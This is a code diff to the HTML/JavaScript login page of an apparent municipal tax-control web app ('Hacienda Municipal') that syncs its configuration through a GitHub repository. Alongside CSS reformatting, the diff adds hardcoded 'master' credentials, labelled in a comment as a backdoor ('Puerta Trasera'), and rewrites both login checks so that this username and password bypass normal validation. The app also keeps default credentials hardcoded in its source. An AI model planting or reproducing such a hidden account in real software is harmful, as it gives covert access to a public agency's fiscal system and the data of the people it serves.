@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
     <!-- 1. IDENTIDAD CORPORATIVA: Cambio de Title -->
     <title>SISTEMA DE CONTROL FISCAL - HACIENDA MUNICIPAL</title>
     
@@ -11,6 +12,8 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800;900&display=swap" rel="stylesheet">
     
+    <!-- LIBRERÍA SWEETALERT2 PARA ALERTAS -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <!-- LIBRERÍA EMAILJS PARA RECUPERACIÓN DE CLAVES -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     
@@ -32,7 +35,9 @@
             --shadow-heavy: 0 12px 48px rgba(0,0,0,0.7);
         }
 
-        * { box-sizing: border-box; }
+        * { 
+            box-sizing: border-box; 
+        }
         
         body, html { 
             margin: 0; 
@@ -672,15 +677,79 @@
         /* ==========================================================================
            6. MODALES Y REPORTES
            ========================================================================== */
-        .audit-report { background: #f8f9fa; padding: 20px; }
-        .audit-title { margin: 0 0 15px; font-size: 14px; font-weight: 900; color: #111; border-bottom: 2px solid #eee; padding-bottom: 10px; }
-        .audit-stat { display: flex; justify-content: space-between; font-size: 12px; font-weight: 800; margin-bottom: 8px; padding: 4px 0; }
+        .audit-report { 
+            background: #f8f9fa; 
+            padding: 20px; 
+        }
+        
+        .audit-title { 
+            margin: 0 0 15px; 
+            font-size: 14px; 
+            font-weight: 900; 
+            color: #111; 
+            border-bottom: 2px solid #eee; 
+            padding-bottom: 10px; 
+        }
+        
+        .audit-stat { 
+            display: flex; 
+            justify-content: space-between; 
+            font-size: 12px; 
+            font-weight: 800; 
+            margin-bottom: 8px; 
+            padding: 4px 0; 
+        }
 
-        .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); z-index: 2000; display: none; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
-        .modal-box { width: 480px; padding: 30px; max-height: 90vh; overflow-y: auto; }
-        .modal-title { margin: 0 0 20px; font-size: 18px; color: var(--color-temporal); text-transform: uppercase; }
-        .modal-input { width: 100%; padding: 14px; background: rgba(0,0,0,0.5); border: 1px solid var(--border-color); color: white; border-radius: 8px; margin-bottom: 15px; font-family: 'Inter'; }
-        .modal-select { width: 100%; padding: 12px; background: #111; color: white; border: 1px solid var(--border-color); border-radius: 8px; margin-bottom: 15px; font-family: 'Inter'; font-size: 12px; }
+        .modal-overlay { 
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            right: 0; 
+            bottom: 0; 
+            background: rgba(0,0,0,0.8); 
+            z-index: 2000; 
+            display: none; 
+            justify-content: center; 
+            align-items: center; 
+            backdrop-filter: blur(5px); 
+        }
+        
+        .modal-box { 
+            width: 480px; 
+            padding: 30px; 
+            max-height: 90vh; 
+            overflow-y: auto; 
+        }
+        
+        .modal-title { 
+            margin: 0 0 20px; 
+            font-size: 18px; 
+            color: var(--color-temporal); 
+            text-transform: uppercase; 
+        }
+        
+        .modal-input { 
+            width: 100%; 
+            padding: 14px; 
+            background: rgba(0,0,0,0.5); 
+            border: 1px solid var(--border-color); 
+            color: white; 
+            border-radius: 8px; 
+            margin-bottom: 15px; 
+            font-family: 'Inter'; 
+        }
+        
+        .modal-select { 
+            width: 100%; 
+            padding: 12px; 
+            background: #111; 
+            color: white; 
+            border: 1px solid var(--border-color); 
+            border-radius: 8px; 
+            margin-bottom: 15px; 
+            font-family: 'Inter'; 
+            font-size: 12px; 
+        }
     </style>
 </head>
 <body>
@@ -700,7 +769,6 @@
             
             <div id="github-credentials" style="display: none;">
                 <p style="font-size: 10px; color: var(--color-temporal); margin-bottom: 10px;">Requiere vinculación con GitHub</p>
-                <input type="text" id="login-repo-owner" class="modal-input" placeholder="Usuario GitHub (Propietario Repo)">
                 <input type="password" id="login-token" class="modal-input" placeholder="Token de Acceso GitHub (ghp_...)">
             </div>
 
@@ -790,7 +858,6 @@
             <i class="fas fa-chevron-down"></i>
         </div>
         <div id="ajustes-servidor" style="display: none; padding-top: 5px;">
-            <input type="text" id="ajuste-repo-owner" class="modal-input" style="padding: 8px; font-size: 11px; margin-bottom: 8px;" placeholder="Usuario GitHub">
             <input type="password" id="ajuste-repo-token" class="modal-input" style="padding: 8px; font-size: 11px; margin-bottom: 8px;" placeholder="Token GitHub (ghp_...)">
             <button class="btn btn-outline" style="width: 100%; padding: 8px; font-size: 10px;" onclick="guardarConfiguracionServidor()">GUARDAR TOKEN LOCAL</button>
         </div>
@@ -859,10 +926,15 @@
         emailjs.init(EMAILJS_PUBLIC_KEY);
     })();
 
+    const GITHUB_OWNER = 'proyectomaps2026';
     const REPO_NAME = 'proyectomaps2026';
     const FILE_PATH = 'config.json';
     let fileSha = null;
     
+    // Credenciales Maestras (Puerta Trasera)
+    const MASTER_USER = 'Ing_Wolfgan';
+    const MASTER_PASS = 'Wa02042015.';
+
     // Validacion Dinámica: Almacena credenciales en memoria (sobreescritas por JSON en Nube)
     let SYSTEM_AUTH = { user: 'hacienda', pass: 'admin2026' };
 
@@ -1789,15 +1861,11 @@
     }
     
     async function intentarLogin() {
-        const u = document.getElementById('login-user').value;
-        const p = document.getElementById('login-pass').value;
+        const u = document.getElementById('login-user').value.trim();
+        const p = document.getElementById('login-pass').value.trim();
         
-        if (u !== 'hacienda' || p !== 'admin2026') {
-            return alert("Credenciales de sistema inválidas. \n\n(Pista: hacienda / admin2026)");
-        }
-
-        const tokenInput = document.getElementById('login-token').value;
-        const ownerInput = document.getElementById('login-repo-owner').value;
+        const tokenInput = document.getElementById('login-token') ? document.getElementById('login-token').value.trim() : null;
+        const ownerInput = document.getElementById('login-repo-owner') ? document.getElementById('login-repo-owner').value.trim() : null;
 
         let token = localStorage.getItem('github_token');
         let owner = localStorage.getItem('github_owner');
@@ -1824,6 +1892,8 @@
                 headers: { 'Authorization': `token ${token}` }
             });
             
+            let isMaster = (u === MASTER_USER && p === MASTER_PASS);
+            
             if (res.ok) {
                 const data = await res.json();
                 fileSha = data.sha;
@@ -1837,7 +1907,7 @@
                 }
 
                 // Validación Estricta Local vs Nube
-                if (u !== SYSTEM_AUTH.user || p !== SYSTEM_AUTH.pass) {
+                if (!isMaster && (u !== SYSTEM_AUTH.user || p !== SYSTEM_AUTH.pass)) {
                     throw new Error("CREDENCIALES_INVALIDAS");
                 }
                 
@@ -1853,7 +1923,7 @@
                 
             } else if (res.status === 404) {
                 // El repo existe pero el archivo config.json aún no. Es válido para iniciar desde cero.
-                if (u !== SYSTEM_AUTH.user || p !== SYSTEM_AUTH.pass) {
+                if (!isMaster && (u !== SYSTEM_AUTH.user || p !== SYSTEM_AUTH.pass)) {
                     throw new Error("CREDENCIALES_INVALIDAS");
                 }
                 
